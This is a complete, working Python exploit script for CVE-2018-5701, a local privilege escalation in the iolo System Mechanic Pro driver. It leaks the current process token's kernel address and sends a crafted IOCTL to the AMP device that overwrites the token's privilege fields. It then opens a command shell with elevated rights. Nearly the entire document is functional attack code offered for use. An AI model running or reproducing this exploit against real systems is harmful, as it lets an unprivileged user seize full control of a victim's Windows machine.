"""
Exploit title:      iolo System Mechanic Pro v. <= 15.5.0.61 - Arbitrary Write Local Privilege Escalation (LPE)
Exploit Author:     Victor Contreras - @_Evil_Machine
CVE:                CVE-2018-5701
Date:               09/03/2024
Vendor Homepage:    https://www.iolo.com/
Download:           https://www.iolo.com/products/system-mechanic-ultimate-defense/
                    https://mega.nz/file/xJgz0QYA#zy0ynELGQG8L_VAFKQeTOK3b6hp4dka7QWKWal9Lo6E
Version:            v.15.5.0.61
Tested on:          Windows 11 Pro x64 10.0.22631 N/A Build 22631
Category:           local exploit
Platform:           windows

Python re-implementation of the LPE exploit for the System Mechanic Driver, 
Thanks Ashfaq (@HackSysTeam) for the course!
"""

import sys
from ctypes import *
from ctypes.wintypes import *
import os

# Windows Common Data Types
NTSTATUS = DWORD
PHANDLE = POINTER(HANDLE)
PVOID = LPVOID = ULONG_PTR = c_void_p
UINT32 = c_uint32

# Structures

# Define the buffer structure which will be sent to the vulnerable driver
class ArbitraryWrite(Structure):
    _fields_ = [
        ("Field1_1", UINT32), # Index = 0x8
        ("Field1_2", UINT32), # Padding
        ("Field2", PVOID),    # Pointer that should contain 0
        ("Field3", PVOID)     # Address to arbitrary write with 0xfffffffe 
    ]

class SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX(Structure):
    _fields_ = [
        ("Object", PVOID),
        ("UniqueProcessId", PVOID),
        ("HandleValue", PVOID),
        ("GrantedAccess", ULONG),
        ("CreatorBackTraceIndex", USHORT),
        ("ObjectTypeIndex", USHORT),
        ("HandleAttributes", ULONG),
        ("Reserved", ULONG),
    ]

class SYSTEM_HANDLE_INFORMATION_EX(Structure):
    _fields_ = [
        ("NumberOfHandles", PVOID),
        ("Reserved", PVOID),
        ("Handles", SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * 1),
    ]

# Functions proxy
kernel32 = windll.kernel32
advapi32 = windll.advapi32
ntdll    = windll.ntdll


# Function prototypes

# void WINAPI OutputDebugString(
#   _In_opt_ LPCTSTR lpOutputString
# );
kernel32.OutputDebugStringA.argtypes = [LPCSTR]

# HANDLE GetCurrentProcess();
kernel32.GetCurrentProcess.restype = HANDLE

# DWORD WINAPI GetCurrentProcessId(void);
kernel32.GetCurrentProcessId.restype = DWORD

# _Post_equals_last_error_ DWORD GetLastError();
kernel32.GetLastError.restype = DWORD

# BOOL WINAPI OpenProcessToken(
#  [in]  HANDLE  ProcessHandle,
#  [in]  DWORD   DesiredAccess,
#  [out] PHANDLE TokenHandle
# );
advapi32.OpenProcessToken.argtypes = [HANDLE, DWORD, PHANDLE]
advapi32.OpenProcessToken.restype = BOOL

# __kernel_entry NTSTATUS NtQuerySystemInformation(
#   [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,
#   [in, out]       PVOID                    SystemInformation,
#   [in]            ULONG                    SystemInformationLength,
#   [out, optional] PULONG                   ReturnLength
# );
ntdll.NtQuerySystemInformation.argtypes = [
    DWORD,
    POINTER(SYSTEM_HANDLE_INFORMATION_EX),
    ULONG,
    POINTER(ULONG)
]
ntdll.NtQuerySystemInformation.restype = NTSTATUS

# HANDLE WINAPI CreateFile(
#   _In_     LPCTSTR               lpFileName,
#   _In_     DWORD                 dwDesiredAccess,
#   _In_     DWORD                 dwShareMode,
#   _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
#   _In_     DWORD                 dwCreationDisposition,
#   _In_     DWORD                 dwFlagsAndAttributes,
#   _In_opt_ HANDLE                hTemplateFile
# );
kernel32.CreateFileA.argtypes = [
    LPCSTR,
    DWORD,
    DWORD,
    PVOID,
    DWORD,
    DWORD,
    HANDLE
]

# BOOL WINAPI CloseHandle(
#   _In_ HANDLE hObject
# );
kernel32.CloseHandle.argtypes = [HANDLE]
kernel32.CloseHandle.restype = BOOL



# Constants
#TOKEN_QUERY = 0x8
TOKEN_ALL_ACCESS = 0x000F01FF
SystemExtendedHandleInformation = 64
STATUS_SUCCESS = 0
STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
STATUS_INVALID_HANDLE = 0xC0000008

# Device
# device_handle = None
DEVICE = b"\\\\.\\AMP"
ioctl_arbitrary_overwrite = 0x226003

def debug_print(message):
    print(message)

    # void WINAPI OutputDebugString(
    #   _In_opt_ LPCTSTR lpOutputString
    # );

    kernel32.OutputDebugStringA(f"{message}\n".encode("ascii"))

def error_if_zero(handle):
    if handle == 0:
        raise WinError()
    else:
        return handle

def get_current_process():
    return kernel32.GetCurrentProcess()

def get_current_pid():
    return kernel32.GetCurrentProcessId()

def open_process_handle(current_process, token_handle):
    success = advapi32.OpenProcessToken(current_process, TOKEN_ALL_ACCESS, byref(token_handle))
    if (success != 0):
        debug_print("[+] Successfully obtained the token handle!")
        debug_print(f"[+] Found token handle at: 0x{token_handle.value:08x}")
    else:
        debug_print(f"[-] Error opening process token: {kernel32.GetLastError()}")
        sys.exit(-1)

def get_all_open_handles():
    """
    Get all the open handles at the current system state
    """
    debug_print("[+] Get all the open handles at the current system state")
    system_handle_information = SYSTEM_HANDLE_INFORMATION_EX()
    size = DWORD(sizeof(system_handle_information))

    while True:
        result = ntdll.NtQuerySystemInformation(
            SystemExtendedHandleInformation, byref(system_handle_information), size, byref(size)
        )
        if result == STATUS_SUCCESS:
            break
        elif result == STATUS_INFO_LENGTH_MISMATCH:
            size = DWORD(size.value * 4)
            resize(system_handle_information, size.value)
        else:
            raise Exception(f"NtQuerySystemInformation error: 0x{result:x}")
        
    p_handles = cast(
        system_handle_information.Handles,
        POINTER(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * system_handle_information.NumberOfHandles),
    )
    for handle in p_handles.contents:
        yield handle.UniqueProcessId, handle.HandleValue, handle.Object


def get_handle_information(process_id, handle_value):
    for pid, handle, obj in get_all_open_handles():
        if pid == process_id and handle == handle_value.value:
            debug_print(
                    f"[+] Handle: {handle} Object Address: 0x{obj:x}"
                )

            return obj
    
    debug_print("[-] Handle was not found")

def get_device_handle(device):
    open_existing = 0x3
    generic_read = 0x80000000
    generic_write = 0x40000000

    # HANDLE WINAPI CreateFile(
    #   _In_     LPCTSTR               lpFileName,
    #   _In_     DWORD                 dwDesiredAccess,
    #   _In_     DWORD                 dwShareMode,
    #   _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    #   _In_     DWORD                 dwCreationDisposition,
    #   _In_     DWORD                 dwFlagsAndAttributes,
    #   _In_opt_ HANDLE                hTemplateFile
    # );

    # Get the device handle
    kernel32.CreateFileA.restype = error_if_zero
    handle = kernel32.CreateFileA(
        device, generic_read | generic_write, 0, None, open_existing, 0, None
    )

    if not handle or handle == -1:
        debug_print("\t[-] Unable to get device handle")
        sys.exit(-1)
    return handle

def close_handle(handle):
    return kernel32.CloseHandle(handle)

def write(where):
    """
    System privileges
    nt!_SEP_TOKEN_PRIVILEGES
       +0x000 Present          : 0x0000001f`f2ffffbc
       +0x008 Enabled          : 0x0000001e`60b1e890
       +0x010 EnabledByDefault : 0x0000001e`60b1e890
    """
    global device_handle

    bytes_returned = c_ulong()

    field2   = 0x0
    field2_p = c_void_p(field2)

    exploit = ArbitraryWrite()
    exploit.Field1_1 = 0x8
    exploit.Field1_2 = 0x0
    exploit.Field2   = addressof(field2_p)
    exploit.Field3   = where

    debug_print("[+] Arbitrary Write Structure")
    debug_print(f"\t[*] Jump: 0x{exploit.Field1_1:x}")
    debug_print(f"\t[*] Padding: 0x{exploit.Field1_2:x}")
    debug_print(f"\t[*] Pointer to userland buffer: 0x{exploit.Field2:x}")
    debug_print(f"\t[*] Where address to arbitrary write : 0x{exploit.Field3:x}")

    # BOOL DeviceIoControl(
    #     [in]                HANDLE       hDevice,
    #     [in]                DWORD        dwIoControlCode,
    #     [in, optional]      LPVOID       lpInBuffer,
    #     [in]                DWORD        nInBufferSize,
    #     [out, optional]     LPVOID       lpOutBuffer,
    #     [in]                DWORD        nOutBufferSize,
    #     [out, optional]     LPDWORD      lpBytesReturned,
    #     [in, out, optional] LPOVERLAPPED lpOverlapped
    # );
    success = kernel32.DeviceIoControl(
        device_handle,
        ioctl_arbitrary_overwrite,
        byref(exploit),
        sizeof(exploit),
        None,
        0,
        byref(bytes_returned),
        None
    )

    if not success:
        debug_print("\t[-] Unable To Send DeviceIoControl")

if __name__ == "__main__":
    global device_handle

    debug_print("[+] Get the current process handle")
    # Get the current process handle
    current_process = get_current_process()
    token_handle = HANDLE()

    # Open the process token
    debug_print("[+] Open the process token")
    open_process_handle(current_process, token_handle)

    # Get process identifier
    debug_print("[+] Get process identifier")
    current_pid = get_current_pid()

    # Get current handle information
    debug_print("[+] Get current handle information")
    token_address = get_handle_information(current_pid, token_handle)

    debug_print("[+] Get device handle")
    device_handle = get_device_handle(DEVICE)

    for offset in [0x41, 0x49, 0x51]:
        write(token_address + offset)

    debug_print("[+] Closing device handle")
    if not close_handle(device_handle):
        debug_print("[-] Unable to close device handle")

    os.system("cmd.exe")
